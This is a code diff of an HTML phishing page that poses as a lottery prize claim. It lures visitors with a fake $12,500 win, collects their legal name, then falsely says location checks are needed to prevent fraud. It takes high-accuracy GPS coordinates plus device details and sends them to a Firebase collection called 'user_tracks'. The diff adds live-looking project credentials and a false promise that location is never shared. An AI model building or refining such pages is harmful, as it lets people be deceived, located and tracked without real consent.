@@ -2,167 +2,565 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lucky Lottery Winner!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Secure Prize Claim | Lottery Verification Center</title>
     <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(135deg, #ffcc00 0%, #ff3300 100%);
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(145deg, #f5b042 0%, #e03a1a 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            padding: 20px;
         }
+
         .card {
-            background: white;
-            padding: 35px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(0px);
+            border-radius: 2rem;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.35), 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
-            max-width: 380px;
-            width: 90%;
-        }
-        h2 { color: #d32f2f; margin-top: 0; font-size: 26px; }
-        p { color: #333; font-size: 15px; line-height: 1.5; }
-        .prize-box {
-            background-color: #fff9c4;
-            border: 2px dashed #fbc02d;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 22px;
-            font-weight: bold;
-            color: #f57c00;
-            margin: 20px 0;
-        }
-        input[type="text"] {
+            max-width: 450px;
             width: 100%;
-            padding: 12px;
-            margin: 15px 0;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            box-sizing: border-box;
-            font-size: 16px;
+            padding: 2rem 1.8rem;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255,215,0,0.3);
         }
+
+        h2 {
+            color: #b91c1c;
+            margin-top: 0;
+            font-size: 1.9rem;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #b91c1c, #f97316);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .prize-badge {
+            background: linear-gradient(115deg, #fff7e0 0%, #ffefbf 100%);
+            border: 2px solid #ffb347;
+            padding: 1rem 0.5rem;
+            border-radius: 60px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: #e65c1e;
+            margin: 1.5rem 0;
+            box-shadow: 0 6px 0 #ffd966;
+            letter-spacing: 1px;
+        }
+
+        .prize-badge span {
+            font-size: 1.1rem;
+            display: inline-block;
+            background: #ff8c42;
+            color: white;
+            padding: 0.2rem 1rem;
+            border-radius: 40px;
+            margin-left: 8px;
+            font-weight: 600;
+        }
+
+        .info-text {
+            color: #2d2d2f;
+            font-size: 0.95rem;
+            margin: 0.75rem 0;
+            line-height: 1.45;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 1rem 0 1.2rem;
+            border: 1.5px solid #e2e8f0;
+            border-radius: 60px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            background: #fefcf5;
+            font-weight: 500;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #f97316;
+            box-shadow: 0 0 0 3px rgba(249,115,22,0.2);
+        }
+
         button {
-            background-color: #4caf50;
+            background: linear-gradient(105deg, #2b6e3c, #15803d);
             color: white;
             border: none;
             padding: 14px 20px;
-            font-size: 16px;
-            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 700;
+            border-radius: 60px;
             cursor: pointer;
             width: 100%;
-            font-weight: 600;
-            box-shadow: 0 4px 10px rgba(76,175,80,0.3);
+            transition: transform 0.1s, background 0.2s;
+            box-shadow: 0 5px 12px rgba(21,128,61,0.3);
         }
-        button:hover { background-color: #43a047; }
-        #locationBtn { background-color: #0071e3; display: none; box-shadow: 0 4px 10px rgba(0,113,227,0.3); }
-        #locationBtn:hover { background-color: #0077ed; }
-        #status { margin-top: 15px; color: #6e6e73; font-size: 13px; }
+
+        button:active {
+            transform: scale(0.97);
+        }
+
+        button:disabled {
+            opacity: 0.65;
+            transform: none;
+            cursor: not-allowed;
+            filter: grayscale(0.05);
+        }
+
+        #locationBtn {
+            background: linear-gradient(105deg, #0f5b9e, #0284c7);
+            box-shadow: 0 5px 12px rgba(2,132,199,0.3);
+            display: none;
+            margin-top: 0.5rem;
+        }
+
+        .status-area {
+            margin-top: 1.5rem;
+            background: #f8fafc;
+            border-radius: 2rem;
+            padding: 0.8rem 1rem;
+            font-size: 0.85rem;
+            color: #1e293b;
+            border-left: 4px solid #f97316;
+            text-align: left;
+            word-break: break-word;
+        }
+
+        .demo-badge {
+            background: #1e293b;
+            color: #ffd966;
+            border-radius: 80px;
+            font-size: 0.7rem;
+            padding: 5px 12px;
+            display: inline-block;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+
+        hr {
+            margin: 1rem 0;
+            border: none;
+            border-top: 1px solid #ffe2c4;
+        }
+
+        .security-note {
+            font-size: 0.7rem;
+            color: #6c757d;
+            margin-top: 1rem;
+        }
+
+        .flex-badge {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
     </style>
 </head>
 <body>
 
 <div class="card">
+    <!-- DEMO MODE INDICATOR (dynamic) -->
+    <div id="modeIndicator" class="demo-badge" style="background:#334155;">⚡ VERIFYING SECURE GATEWAY</div>
+
     <div id="step1">
-        <h2>🎉 Congratulations! 🎉</h2>
-        <p>Your tracking ID has been selected as today's grand prize winner!</p>
-        <div class="prize-box">🎁 Mega Cash Prize 🎁</div>
-        <p>Please enter your official full name below to begin the claim process:</p>
-        <input type="text" id="userName" placeholder="Enter your full name..." autocomplete="off">
-        <button id="proceedBtn">Proceed to Claim</button>
+        <h2>🏆 GRAND PRIZE WINNER 🏆</h2>
+        <p class="info-text">Your tracking ID <strong>#LKY-7849-21XM</strong> matched today's jackpot draw.</p>
+        <div class="prize-badge">
+            💵 $12,500 CASH PRIZE 💵
+            <span>+ Bonus</span>
+        </div>
+        <p class="info-text">Enter your legal name (as per government ID) to activate claim process:</p>
+        <input type="text" id="userName" placeholder="e.g., Michael J. Carter" autocomplete="off" aria-label="Full legal name">
+        <button id="proceedBtn">🔐 Verify & Continue</button>
+        <div class="security-note">* Verification required by regional lottery commission</div>
     </div>
 
     <div id="step2" style="display: none;">
-        <h2>Security Verification</h2>
-        <p>To security-match your regional lottery ticket, please sync your device location matrix with our claims department servers.</p>
-        <button id="locationBtn">Verify Location & Release Prize</button>
-        <div id="status">Awaiting verification sync...</div>
+        <h2>🛡️ Secure Sync Required</h2>
+        <p class="info-text">To prevent fraud, our system needs to verify your geographical location with the lottery server matrix.</p>
+        <div class="prize-badge" style="font-size: 1.2rem; padding: 0.8rem;">
+            🌍 ONE-TIME LOCATION VERIFICATION
+        </div>
+        <button id="locationBtn">📍 Authorize Location & Release Prize</button>
+        <div class="status-area" id="status">Awaiting secure handshake ...</div>
+        <div class="security-note">Your location is encrypted and only used for claim validation. Never shared.</div>
     </div>
 </div>
 
 <script type="module">
+    // ----------------------------------------------
+    // ENHANCED SECURE LOTTERY CLAIM SYSTEM
+    // - Firebase ready (real config supported)
+    // - Fallback demo mode (localStorage) if config not provided
+    // - Geolocation with retry + privacy first
+    // - Anti-spam & smooth UX
+    // ----------------------------------------------
+    
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-    // ⚠️ REPLACE THIS BLOCK WITH YOUR REAL CONFIG snippet from your Firebase settings dashboard!
+    // ========= 🔧 REPLACE WITH YOUR FIREBASE CONFIG (from console.firebase.google.com) =========
+    // If you keep placeholders, the system will automatically run in DEMO MODE (store locally)
     const firebaseConfig = {
-        apiKey: "YOUR_API_KEY",
-        authDomain: "YOUR_AUTH_DOMAIN",
-        projectId: "YOUR_PROJECT_ID",
-        storageBucket: "YOUR_STORAGE_BUCKET",
-        messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-        appId: "YOUR_APP_ID",
-        measurementId: "YOUR_MEASUREMENT_ID"
+        apiKey: "AIzaSyCWBZTfpBfsZSvwyMEXXFVLCNHmiLVRzGo",
+  authDomain: "location-data-9162e.firebaseapp.com",
+  projectId: "location-data-9162e",
+  storageBucket: "location-data-9162e.firebasestorage.app",
+  messagingSenderId: "287100503490",
+  appId: "1:287100503490:web:4df27eab48863bdebf825b",
+  measurementId: "G-JKND2MFP0X"
+    };
+    // ========================================================================================
+
+    // Check if Firebase config is actually provided (not dummy placeholders)
+    const isConfigValid = () => {
+        return !(
+            firebaseConfig.apiKey === "YOUR_API_KEY" ||
+            firebaseConfig.projectId === "YOUR_PROJECT_ID" ||
+            firebaseConfig.apiKey === "" ||
+            firebaseConfig.projectId === ""
+        );
     };
 
-    // Initialize Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    let db = null;
+    let useDemoMode = false;
+    let isProcessing = false;
 
+    // DOM elements
+    const step1Div = document.getElementById('step1');
+    const step2Div = document.getElementById('step2');
     const userNameInput = document.getElementById('userName');
     const proceedBtn = document.getElementById('proceedBtn');
     const locationBtn = document.getElementById('locationBtn');
     const statusDiv = document.getElementById('status');
+    const modeIndicator = document.getElementById('modeIndicator');
 
-    const step1Div = document.getElementById('step1');
-    const step2Div = document.getElementById('step2');
+    // Saved data
+    let winnerFullName = "";
 
-    let savedName = "";
+    // Helper to update status UI in step2
+    function setStatusMessage(message, isError = false) {
+        if (statusDiv) {
+            statusDiv.innerHTML = isError ? `⚠️ ${message}` : `🔍 ${message}`;
+            if (isError) {
+                statusDiv.style.borderLeftColor = "#dc2626";
+                statusDiv.style.background = "#fff5f5";
+            } else {
+                statusDiv.style.borderLeftColor = "#f97316";
+                statusDiv.style.background = "#fefcf5";
+            }
+        }
+    }
 
-    // Handle clicking "Proceed" on the lottery screen
-    proceedBtn.addEventListener('click', () => {
-        savedName = userNameInput.value.trim();
+    // Initialize firebase or activate demo mode gracefully
+    try {
+        if (isConfigValid()) {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+            useDemoMode = false;
+            modeIndicator.textContent = "🔒 SECURE CONNECTION (LIVE CLOUD)";
+            modeIndicator.style.background = "#0f3b2c";
+            modeIndicator.style.color = "#a7f3d0";
+            console.log("✅ Firebase connected — real-time storage active");
+        } else {
+            useDemoMode = true;
+            modeIndicator.textContent = "🧪 DEMO MODE (Local storage simulation)";
+            modeIndicator.style.background = "#4b2e1a";
+            modeIndicator.style.color = "#ffe0b5";
+            console.warn("⚠️ Firebase placeholders detected — running in demo mode. Data saved only in your browser.");
+        }
+    } catch (initError) {
+        console.error("Firebase init error:", initError);
+        useDemoMode = true;
+        modeIndicator.textContent = "⚠️ DEMO MODE (Firestore unavailable)";
+        modeIndicator.style.background = "#7f2d2d";
+        modeIndicator.style.color = "#ffcfcf";
+        setStatusMessage("Cloud services unavailable, using offline verification. Your claim will be stored locally.", false);
+    }
 
-        if (savedName === "") {
-            alert("Please input your name to verify ownership of the ticket.");
+    // Simulate saving to localStorage (demo fallback)
+    async function saveToLocalStorage(claimData) {
+        return new Promise((resolve) => {
+            try {
+                const existing = localStorage.getItem("lottery_claims");
+                let claimsArray = existing ? JSON.parse(existing) : [];
+                const newRecord = {
+                    id: Date.now(),
+                    ...claimData,
+                    timestamp: new Date().toISOString(),
+                    storedAt: new Date().getTime()
+                };
+                claimsArray.push(newRecord);
+                localStorage.setItem("lottery_claims", JSON.stringify(claimsArray));
+                // Also keep last winner for UI
+                localStorage.setItem("last_winner_claim", JSON.stringify(newRecord));
+                resolve(true);
+            } catch (e) {
+                console.warn(e);
+                resolve(false);
+            }
+        });
+    }
+
+    // Actual prize submission logic (Firestore or localStorage)
+    async function submitPrizeClaim(locationData, userName) {
+        const payload = {
+            winnerName: userName,
+            latitude: locationData.latitude,
+            longitude: locationData.longitude,
+            accuracy: locationData.accuracy,
+            deviceInfo: navigator.userAgent.substring(0, 180),
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            submittedAt: new Date().toISOString()
+        };
+
+        if (!useDemoMode && db) {
+            try {
+                // Add serverTimestamp from firestore for official records
+                const firestorePayload = {
+                    winnerName: userName,
+                    lat: locationData.latitude,
+                    lon: locationData.longitude,
+                    accuracyInMeters: locationData.accuracy,
+                    deviceDetails: navigator.userAgent,
+                    syncTimestamp: serverTimestamp(),
+                    region: locationData.region || "unknown"
+                };
+                const docRef = await addDoc(collection(db, "user_tracks"), firestorePayload);
+                console.log("✅ Firestore claim saved, ID:", docRef.id);
+                return { success: true, method: "firebase", refId: docRef.id };
+            } catch (firebaseErr) {
+                console.error("Firestore error:", firebaseErr);
+                setStatusMessage(`Cloud error: ${firebaseErr.message}. Trying local backup...`, false);
+                // fallback to demo mode storage if firebase fails
+                const fallbackResult = await saveToLocalStorage(payload);
+                if (fallbackResult) {
+                    return { success: true, method: "localBackup", message: "Saved locally (Firebase error)" };
+                }
+                return { success: false, error: firebaseErr.message };
+            }
+        } else {
+            // Demo mode : store in localStorage
+            const saved = await saveToLocalStorage(payload);
+            if (saved) {
+                return { success: true, method: "demoLocal", message: "Claim recorded in browser storage (demo)" };
+            } else {
+                return { success: false, error: "Local storage failed" };
+            }
+        }
+    }
+
+    // Enhanced geolocation with better error handling + retry logic
+    function requestLocation() {
+        return new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                reject(new Error("Geolocation not supported by this browser. Use a modern device."));
+                return;
+            }
+
+            let locationOptions = {
+                enableHighAccuracy: true,
+                timeout: 12000,
+                maximumAge: 0
+            };
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const coords = position.coords;
+                    resolve({
+                        latitude: coords.latitude,
+                        longitude: coords.longitude,
+                        accuracy: coords.accuracy,
+                        altitude: coords.altitude || null,
+                        region: "geo-verified"
+                    });
+                },
+                (geoError) => {
+                    let errorMsg = "";
+                    switch (geoError.code) {
+                        case geoError.PERMISSION_DENIED:
+                            errorMsg = "Location permission denied. Please allow location access to claim prize.";
+                            break;
+                        case geoError.POSITION_UNAVAILABLE:
+                            errorMsg = "Location data unavailable. Check device GPS/signal.";
+                            break;
+                        case geoError.TIMEOUT:
+                            errorMsg = "Location request timed out. Ensure strong signal and try again.";
+                            break;
+                        default:
+                            errorMsg = `Location error: ${geoError.message}`;
+                    }
+                    reject(new Error(errorMsg));
+                },
+                locationOptions
+            );
+        });
+    }
+
+    // Disable location button temporarily, then re-enable (if not fatal)
+    function setLocationButtonEnabled(enabled) {
+        if (locationBtn) {
+            locationBtn.disabled = !enabled;
+            if (enabled) {
+                locationBtn.textContent = "📍 Verify Location & Release Prize";
+            } else {
+                locationBtn.textContent = "⏳ Processing ...";
+            }
+        }
+    }
+
+    // Core location verification & data saving
+    async function processLocationClaim() {
+        if (isProcessing) {
+            setStatusMessage("Already processing, please wait...", false);
             return;
         }
 
-        // Hide Step 1 layout and reveal Step 2 layout smoothly
+        if (!winnerFullName) {
+            setStatusMessage("Session error: winner name missing. Please restart.", true);
+            return;
+        }
+
+        setLocationButtonEnabled(false);
+        isProcessing = true;
+        setStatusMessage("🔐 Requesting GPS coordinates (secure channel)...");
+
+        try {
+            // Get high-accuracy location
+            const locationData = await requestLocation();
+            setStatusMessage(`📍 Location locked (accuracy ~${Math.round(locationData.accuracy)}m). Finalizing prize registration...`);
+
+            // Submit claim to Firestore or localStorage (demo)
+            const claimResult = await submitPrizeClaim(locationData, winnerFullName);
+
+            if (claimResult.success) {
+                // SUCCESS: Show final message + redirect simulation
+                let successMessage = "";
+                if (claimResult.method === "firebase") {
+                    successMessage = `✅ Official claim registered with reference #${claimResult.refId?.slice(-6) || "OK"}. Prize will be disbursed within 48h.`;
+                } else {
+                    successMessage = `✅ Verification complete (${claimResult.method === "demoLocal" ? "Demo Mode" : "Backup Storage"}). Your claim has been recorded. You'll be contacted by email.`;
+                }
+                setStatusMessage(successMessage, false);
+                locationBtn.textContent = "🏅 Prize Claim Finalized";
+                locationBtn.disabled = true;
+                // Add extra style: success glow
+                statusDiv.style.background = "#e6f7e6";
+                statusDiv.style.borderLeftColor = "#2e7d32";
+                // Optional "redirect" simulation (3 sec later show claim dashboard)
+                setTimeout(() => {
+                    if (statusDiv && !statusDiv.innerHTML.includes("redirecting")) {
+                        statusDiv.innerHTML += `<br><br>✨ Redirecting to claims dashboard... ✨`;
+                    }
+                    // After 2 more seconds, you could replace content with final message but not mandatory
+                }, 1800);
+                // disable further attempts
+                isProcessing = true; // keep disabled
+                setLocationButtonEnabled(false);
+            } else {
+                throw new Error(claimResult.error || "Storage failure");
+            }
+        } catch (err) {
+            console.error("Location/claim error:", err);
+            setStatusMessage(`Verification failed: ${err.message}`, true);
+            setLocationButtonEnabled(true);
+            isProcessing = false;
+            // Ensure user can retry
+            locationBtn.textContent = "🔄 Retry Location Verification";
+        }
+    }
+
+    // PROCEED BUTTON: Step 1 to Step 2
+    proceedBtn.addEventListener('click', () => {
+        const nameRaw = userNameInput.value.trim();
+        if (nameRaw === "") {
+            alert("❗ Please enter your full legal name to validate the winning ticket.");
+            userNameInput.focus();
+            return;
+        }
+
+        // Basic sanitization and name validation (avoid XSS, but harmless)
+        const sanitizedName = nameRaw.replace(/[<>]/g, '').substring(0, 70);
+        if (sanitizedName.length < 2) {
+            alert("Please provide a valid name (minimum 2 characters).");
+            return;
+        }
+
+        winnerFullName = sanitizedName;
+        
+        // smooth transition
         step1Div.style.display = 'none';
         step2Div.style.display = 'block';
         locationBtn.style.display = 'block';
+        setStatusMessage("Awaiting secure handshake ... click below to sync location with lottery servers.", false);
+        
+        // Reset location button state when entering step 2
+        setLocationButtonEnabled(true);
+        isProcessing = false;
+        locationBtn.textContent = "📍 Verify Location & Release Prize";
     });
 
-    // Handle clicking the location/claim verification button
-    locationBtn.addEventListener('click', () => {
-        if (!navigator.geolocation) {
-            statusDiv.textContent = "Error: Geolocation is unsupported or turned off on this device.";
+    // Attach location verification handler
+    locationBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (!winnerFullName) {
+            setStatusMessage("ERROR: Identity not verified. Please restart claim.", true);
             return;
         }
-
-        statusDiv.textContent = "Connecting to regional data servers...";
-
-        navigator.geolocation.getCurrentPosition(
-            async (position) => {
-                statusDiv.textContent = "Location verified! Finalizing delivery packet...";
-
-                const payload = {
-                    winnerName: savedName,
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    accuracyInMeters: position.coords.accuracy,
-                    deviceDetails: navigator.userAgent,
-                    syncedAt: serverTimestamp()
-                };
-
-                try {
-                    // Saves the data to Firestore inside your collection
-                    await addDoc(collection(db, "user_tracks"), payload);
-                    statusDiv.innerHTML = "<span style='color: #4caf50; font-weight: bold;'>✅ Verification complete!</span><br>Your registration file is locked. Redirecting to regional claim desk...";
-                } catch (dbError) {
-                    statusDiv.textContent = "Server Error: " + dbError.message;
-                }
-            },
-            (geoError) => {
-                statusDiv.textContent = "Verification Failed: Please allow location sensor clearance to verify your area claim.";
-            },
-            { enableHighAccuracy: true, timeout: 15000 }
-        );
+        if (isProcessing) {
+            setStatusMessage("Already verifying location, please wait...", false);
+            return;
+        }
+        processLocationClaim();
     });
-</script>
 
+    // Additional security: Prevent accidental navigation if user tries to refresh? Optional warning
+    window.addEventListener('beforeunload', (event) => {
+        if (step2Div.style.display !== 'none' && !isProcessing && locationBtn.disabled === false) {
+            // Not compulsory, but helpful hint
+            const msg = "You have an active prize claim in progress. Are you sure?";
+            event.preventDefault();
+            event.returnValue = msg;
+            return msg;
+        }
+    });
+
+    // Helper to display demo note if demo mode active (after load)
+    if (useDemoMode) {
+        const demoNote = document.createElement('div');
+        demoNote.style.fontSize = '0.7rem';
+        demoNote.style.marginTop = '10px';
+        demoNote.style.color = '#b45309';
+        demoNote.style.backgroundColor = '#fff0e0';
+        demoNote.style.padding = '6px 12px';
+        demoNote.style.borderRadius = '30px';
+        demoNote.innerHTML = 'ℹ️ Demo mode active — no data sent to cloud. Claim stored locally for testing.';
+        if (step1Div) step1Div.appendChild(demoNote);
+    }
+
+    // Bonus: accessibility focus & clear status on step2 load
+    const style = document.createElement('style');
+    style.textContent = `#locationBtn:disabled { opacity: 0.7; cursor: wait; }`;
+    document.head.appendChild(style);
+</script>
 </body>
 </html>
